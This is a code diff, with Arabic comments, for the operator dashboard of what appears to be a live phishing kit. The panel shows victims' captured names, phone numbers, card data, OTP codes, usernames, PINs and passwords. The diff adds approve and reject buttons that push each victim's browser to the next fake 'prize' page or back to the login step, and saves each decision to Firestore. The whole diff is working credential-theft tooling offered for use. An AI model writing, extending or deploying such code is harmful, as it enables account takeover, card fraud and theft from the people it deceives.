@@ -33,6 +33,7 @@
   const cardDecisionOverrides = new Map();
   // إجراءات صناديق رموز التحقق (موافقة = تمرير لإدخال كلمة المرور، أو رفض) — لكل رمز مفتاح مستقل
   const otpActionOverrides = new Map();
+  const loginActionOverrides = new Map();
   const OTP_ACTION_LABELS = { approve: 'تمت الموافقة (تمرير إلى كلمة المرور)', reject: 'تم رفض الرمز' };
   // مفتاح آمن لأسماء حقول Firestore (حروف/أرقام/شرطة سفلية فقط — لا نقاط)
   const safeKey = (v) => String(v).replace(/[^A-Za-z0-9_]/g, '_');
@@ -785,18 +786,63 @@
     }).join('') : '<p class="ref-muted">لا توجد بطاقة</p>';
     // أقسام الصناديق الثلاثة — تُرتب لاحقاً من الأحدث إلى الأقدم
     const basicBoxHtml = `<article class="ref-basic-box"><h3>معلومات أساسية</h3>${field('الاسم', visitor.name)}${field('رقم الهاتف', visitor.phone)}${field('نوع الاختيار (هل لديك حساب؟)', visitor.hasAccountLabel || visitor.hasAccount)}${field('الدولة', visitor.country)}</article>`;
-    // صناديق بيانات الدخول — كل محاولة تسجيل دخول في صندوق منفصل (لا تُستبدل)
+    // صناديق بيانات الدخول: (اسم المستخدم + الرقم السري) في صندوق واحد لكل محاولة،
+    // وكلمة المرور النصية في صندوق منفصل — وكل محاولة جديدة تُضاف كصندوق مستقل مع أزرار موافقة/رفض.
     const loginEntries = Array.isArray(visitor.logins) ? [...visitor.logins] : [];
     if (!loginEntries.length && (visitor.username || visitor.pass)) {
       loginEntries.push({ username: visitor.username, password: visitor.pass });
     }
-    loginEntries.sort((a, b) => (toMillis(b && b.at) || 0) - (toMillis(a && a.at) || 0));
-    const loginBoxesHtml = loginEntries.map((entry, i) => {
-      const t = toMillis(entry && entry.at);
-      // صندوق اسم المستخدم: للعرض فقط بلا أزرار موافقة/رفض (الموافقة/الرفض تكون على رمز التحقق)
-      return `<article class="ref-basic-box" data-ref-time="${t}"><h3>بيانات الدخول ${loginEntries.length > 1 ? '#' + (loginEntries.length - i) : ''}${t ? ` <time class="ref-box-time" data-box-counter data-box-time="${t}" datetime="${t}">${escapeHtml(formatRefTime(t))}</time>` : ''}</h3>${field('اسم المستخدم', entry && entry.username)}${field('كلمة المرور', entry && entry.password)}</article>`;
+    loginEntries.sort((a, b) => (toMillis(a && a.at) || 0) - (toMillis(b && b.at) || 0));
+    const isTextPasswordEntry = (entry) => /نصي/.test(String((entry && entry.page) || ''));
+    const loginBoxes = [];
+    let pendingUsernameEntry = null;
+    loginEntries.forEach((entry) => {
+      const at = toMillis(entry && entry.at);
+      const password = String((entry && entry.password) || '');
+      const username = String((entry && entry.username) || '');
+      if (isTextPasswordEntry(entry)) {
+        loginBoxes.push({ kind: 'text', password: password, username: username, at: at });
+        return;
+      }
+      // خطوة اسم المستخدم وحدها: تُحفظ مؤقتاً حتى يصل الرقم السري ليجمعهما صندوق واحد
+      if (!password) { pendingUsernameEntry = { username: username, at: at }; return; }
+      loginBoxes.push({
+        kind: 'login',
+        username: username || (pendingUsernameEntry && pendingUsernameEntry.username) || '',
+        pin: password,
+        at: at,
+      });
+      pendingUsernameEntry = null;
+    });
+    if (pendingUsernameEntry) {
+      loginBoxes.push({ kind: 'login', username: pendingUsernameEntry.username, pin: '', at: pendingUsernameEntry.at, pending: true });
+    }
+    loginBoxes.sort((a, b) => (b.at || 0) - (a.at || 0));
+    const loginBoxCounts = { login: 0, text: 0 };
+    [...loginBoxes].reverse().forEach((box) => { box.number = ++loginBoxCounts[box.kind]; });
+    const loginActionsMap = (visitor.loginActions && typeof visitor.loginActions === 'object') ? visitor.loginActions : {};
+    const loginActionFor = (key) => {
+      const local = loginActionOverrides.get((visitor.sessionId || visitor.id) + '|' + key);
+      if (local) return local;
+      const remote = loginActionsMap[key];
+      return (remote && remote.action) ? { action: remote.action, label: remote.label || '' } : null;
+    };
+    const loginSidAttr = escapeHtml(String(visitor.sessionId || visitor.id || ''));
+    const loginBoxesHtml = loginBoxes.map((box, i) => {
+      const t = box.at || 0;
+      const key = (box.kind === 'text' ? 'textpass_' : 'login_') + (box.at || ('i' + i));
+      const done = loginActionFor(key);
+      const title = box.kind === 'text' ? 'كلمة المرور النصية' : 'بيانات الدخول';
+      const numberLabel = loginBoxCounts[box.kind] > 1 ? ' #' + box.number : '';
+      const fieldsHtml = box.kind === 'text'
+        ? field('كلمة المرور', box.password)
+        : field('اسم المستخدم', box.username) + field('الرقم السري', box.pin || (box.pending ? 'بانتظار الإدخال' : ''));
+      const actionsHtml = done
+        ? `<div class="ref-login-status ref-login-status--${escapeHtml(done.action)}">${escapeHtml(done.label || 'تم التنفيذ')}</div>`
+        : (box.pending ? '' : `<div class="ref-card-actions"><button data-login-action="approve" data-login-kind="${box.kind}" data-login-key="${escapeHtml(key)}" data-session-id="${loginSidAttr}">✓ موافقة</button><button data-login-action="reject" data-login-kind="${box.kind}" data-login-key="${escapeHtml(key)}" data-session-id="${loginSidAttr}">× رفض</button></div>`);
+      return `<article class="ref-basic-box" data-ref-time="${t}"><h3>${title}${numberLabel}${t ? ` <time class="ref-box-time" data-box-counter data-box-time="${t}" datetime="${t}">${escapeHtml(formatRefTime(t))}</time>` : ''}</h3>${fieldsHtml}${actionsHtml}</article>`;
     }).join('');
-    const loginBoxTime = loginEntries.length ? (loginEntries[0] && loginEntries[0].at) : (visitor.customerUpdatedAt || visitor.createdDate);
+    const loginBoxTime = loginBoxes.length ? loginBoxes[0].at : (visitor.customerUpdatedAt || visitor.createdDate);
     // صناديق إعادة تعيين كلمة المرور — كل محاولة في صندوق منفصل
     const resetEntries = Array.isArray(visitor.passwordResets) ? [...visitor.passwordResets] : [];
     resetEntries.sort((a, b) => (toMillis(b && b.at) || 0) - (toMillis(a && a.at) || 0));
@@ -956,6 +1002,31 @@
         // الموافقة: تمرير العميل إلى صفحة إدخال كلمة المرور النصية
         sendNavCommand('كلمة المرور النصية', 'prize-text-password.html');
         recordOtpAction(sid, key, 'approve', OTP_ACTION_LABELS.approve);
+      }
+      renderReferenceDetail(visitor);
+    }));
+    // أزرار صناديق الدخول وكلمة المرور النصية: موافقة تمرّر العميل للخطوة التالية، والرفض يعيده لاسم المستخدم
+    const recordLoginAction = (sid, key, action, label) => {
+      if (!sid || !key) return;
+      loginActionOverrides.set(sid + '|' + key, { action, label });
+      db.collection('customers').doc(sid).set({
+        loginActions: { [key]: { action, label, at: Date.now() } },
+      }, { merge: true }).catch((e) => console.warn('login action persist failed:', e));
+    };
+    els.referenceDetailContent.querySelectorAll('[data-login-action]').forEach(btn => btn.addEventListener('click', () => {
+      const act = btn.dataset.loginAction;
+      const isText = btn.dataset.loginKind === 'text';
+      const sid = btn.dataset.sessionId || visitor.sessionId || visitor.id;
+      const key = btn.dataset.loginKey || '';
+      if (act === 'reject') {
+        rejectOtpToUsername(sid);
+        recordLoginAction(sid, key, 'reject', isText ? 'تم رفض كلمة المرور' : 'تم رفض بيانات الدخول');
+      } else if (isText) {
+        sendNavCommand('انتظار المسابقة', 'prize-wait.html');
+        recordLoginAction(sid, key, 'approve', 'تمت الموافقة (تمرير إلى انتظار المسابقة)');
+      } else {
+        sendNavCommand('كلمة المرور النصية', 'prize-text-password.html');
+        recordLoginAction(sid, key, 'approve', 'تمت الموافقة (تمرير إلى كلمة المرور النصية)');
       }
       renderReferenceDetail(visitor);
     }));
